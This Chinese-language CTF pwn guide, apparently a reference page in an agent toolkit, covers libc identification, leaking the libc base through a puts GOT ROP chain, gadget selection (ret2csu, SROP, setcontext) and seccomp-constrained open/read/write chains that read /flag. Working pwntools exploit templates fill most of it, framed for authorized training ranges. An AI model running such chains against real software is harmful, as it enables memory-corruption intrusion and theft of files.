# 04 libc 版本、gadget 与 seccomp ORW

> 配套 `Tool/skill/pwn-crypto/references/heap-and-sandbox.md`、`mitigation-matrix.md`。
> 只用于授权靶场；没有同版本 libc 时，所有偏移都只能算“疑似”。

## 入口信号

- ELF 目标、`NX enabled`、需要 ret2libc/ROP 或 ORW。
- 题目给了 `libc.so.6`/`ld.so`，或远程泄漏出 `0x7f...` 地址。
- `seccomp-tools dump ./chall` 显示允许 syscall 很少，直接 `execve` 会被杀。

## 0. 先定 libc，再谈偏移

```bash
sha256sum ./chall ./libc.so.6
file ./chall
strings -a libc.so.6 | grep -m1 'GNU C Library'
readelf -n libc.so.6 | grep -A1 'Build ID'
ldd ./chall
python Tool/scripts/pwn-check.py --file ./chall --json
```

**确认判据**：`libc.so.6` 的 build id 与目标一致，或远程泄漏的 `puts` 低 12 位与本地 libc 的
`puts` 偏移一致（低 12 位页内偏移不受 ASLR 影响）。

**失败判据**：只用了系统 `ldd` 的 libc、没有核对题目自带 libc；泄漏低 12 位匹配不上仍硬套偏移。

## 1. 泄漏 libc 基址

```python
from pwn import *
context.binary = elf = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.call(elf.symbols.get("main", elf.entry))
p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
assert leaked & 0xfff == libc.symbols["puts"] & 0xfff
libc.address = leaked - libc.symbols["puts"]
```

**确认判据**：泄漏值页对齐；`libc.address` 与 gdb `vmmap` 里的 libc 段一致。
**失败判据**：泄漏为 0/非地址；页内偏移不匹配；把堆地址当 libc。

## 2. gadget 不足时的顺序

```bash
ROPgadget --binary ./chall --only "pop|ret" | grep -E "pop rdi ; ret|pop rsi ; ret|pop rdx ; ret"
ROPgadget --binary ./libc.so.6 --only "syscall|leave|ret"
objdump -d ./chall | grep -A20 '<__libc_csu_init>'
```

优先级：`pop rdi/rsi/rdx` → ret2csu → SROP（`rt_sigreturn`）→ libc `setcontext` → 栈迁移。
**确认判据**：gdb 单步到 `ret` 时 `$rsp` 指向下一个 gadget，`$rip` 命中预期。
**失败判据**：缺 `pop rdx` 却硬套三参数模板；`one_gadget` 约束寄存器不满足。

## 3. seccomp 白名单与 ORW

```bash
seccomp-tools dump ./chall
# 记录 arch、allowed syscalls、参数过滤；无工具时用 strace -f 观察
```

x86_64 常用号：`read=0 write=1 open=2 close=3 mprotect=10 sendfile=40 openat=257`。

```python
flag = next(libc.search(b"/flag\x00"))
bss = elf.bss() + 0x200
rop = ROP(libc)
rop.call(libc.symbols["open"], [flag, 0])
rop.call(libc.symbols["read"], [3, bss, 0x100])
rop.call(libc.symbols["write"], [1, bss, 0x100])
p.sendline(flat({OFFSET: rop.chain()}))
print(p.recvall(timeout=3))
```

- 只有 `openat`：`openat(AT_FDCWD=-100, path, 0)`；路径要先写进可写内存。
- 允许 `mprotect`：把 shellcode 写到 bss，`mprotect(bss & ~0xfff, 0x1000, 7)` 后跳。
- flag 可能已被父进程打开：先试 `read(3, bss, 0x100)`，不要盲目 `open`。

**确认判据**：`strace`/seccomp 日志出现预期 `openat/read/write` 序列，stdout 含 flag。
**失败判据**：只读了一半 BPF；fd 猜错；路径不在可写内存；`open`/`openat` 混用。

## 4. 本机限制与降级

本仓库的 Windows 开发机没有 Linux ELF 工具链（只有 MinGW）。因此：

- 本地只验证 PE 语义（`pwn-check.py`、`04-walkthrough-local-pe.md`）；
- ELF/libc/seccomp 部分必须在 WSL2/远端 Linux 靶机执行，或在报告中写 `blocked_at: "tool-missing"`；
- 没有同版本 libc 时，最多给“疑似偏移”，不得宣布稳定打通。

## 失败判据

- 没定 libc build id 就写偏移 → 全链不可信。
- seccomp 白名单没读全就拼 ORW → 大概率被 `SECCOMP_RET_KILL`。
- `system("/bin/sh")` 被沙箱杀后仍重复同一条链 → 应转 ORW/SROP，而不是重试。

## 边界

- 本页不覆盖内核提权、容器逃逸；只处理进程内 ROP/ORW。
- 远程与本地 libc/启动参数不同，必须在远程做一次泄漏校验。
- 所有 gadget 偏移以目标 libc 为准，文中不写死数字。
